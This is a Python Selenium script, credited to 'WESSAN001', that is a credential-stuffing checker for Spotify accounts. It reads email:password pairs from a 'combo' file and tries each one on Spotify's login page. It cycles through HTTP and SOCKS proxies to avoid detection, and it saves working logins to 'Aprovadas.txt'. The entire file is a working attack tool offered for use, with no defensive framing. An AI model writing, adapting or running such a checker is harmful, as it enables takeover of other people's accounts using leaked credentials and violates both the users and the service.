from selenium import webdriver
from selenium.webdriver.common.by import By
from chromedriver_autoinstaller import install as chromedriver_install
from termcolor import colored
import time

print(colored('CODED BY [WESSAN001]', 'yellow'))

# Function to read proxies from a file and return them as a list
def read_proxies(file_name):
    proxies = []
    with open(file_name, "r") as filestream:
        for line in filestream:
            proxies.append(line.strip())
    return proxies

# Function to cycle through proxies in a circular manner using a generator
def cycle_proxies(proxies):
    index = 0
    while True:
        yield proxies[index]
        index = (index + 1) % len(proxies)


def check_account(email, password, proxy=None):
    try:
        options = webdriver.ChromeOptions()
        if proxy:
            if proxy.startswith("http://"):
                options.add_argument(f"--proxy-server={proxy}")
            elif proxy.startswith("socks4://") or proxy.startswith("socks5://"):
                options.add_argument(f"--proxy-server={proxy}")
                options.add_argument("--proxy-type=socks5" if proxy.startswith("socks5://") else "--proxy-type=socks4")
        driver = webdriver.Chrome(options=options)
        
        driver.get('https://accounts.spotify.com/login')
        time.sleep(1)

        # Find the email and password input fields and the login button on the login page
        email_input = driver.find_element(By.XPATH, '//*[@id="login-username"]')
        password_input = driver.find_element(By.XPATH, '//*[@id="login-password"]')
        login_button = driver.find_element(By.XPATH, '//*[@id="login-button"]/span[1]')

        # Enter the email and password and click the login button
        email_input.send_keys(email)
        password_input.send_keys(password)
        login_button.click()

        time.sleep(2)

        # Check if the XPATH are on logged page, which indicates a successful login
        if driver.current_url == 'https://accounts.spotify.com/pt-BR/status':
            print(colored(f"# APROVADO: {email}:{password}", 'green'))
            with open("Aprovadas.txt", "a") as good_file:
                good_file.write(f"{email}:{password}\n")
        else:
            # If login fails, find the error message element and print the error
            error_message_element = driver.find_element(By.XPATH, '//*[@id="root"]/div/div[2]/div/div/div[1]/div/span')
            error_message = error_message_element.text.strip()
            if "Nome de usuário ou senha incorretos." in error_message:
                print(colored(f"# REPROVADA: {email}:{password}", 'red'))
            
            with open("Reprovadas.txt", "a") as bad_file:
                bad_file.write(f"{email}:{password} - {error_message}\n")

    except Exception as e:
        print(f"Error: {e}")

    finally:
        driver.refresh()

def main():
    proxies_file = "proxies.txt"
    proxies = read_proxies(proxies_file)
    proxy_generator = cycle_proxies(proxies)

    with open("combo.txt", "r") as filestream:
        for line in filestream:
            email, password = line.strip().split(":")
            proxy = next(proxy_generator)
            print(f"Usando a Proxy: {proxy}")
            check_account(email, password, proxy)

if __name__ == "__main__":
    main()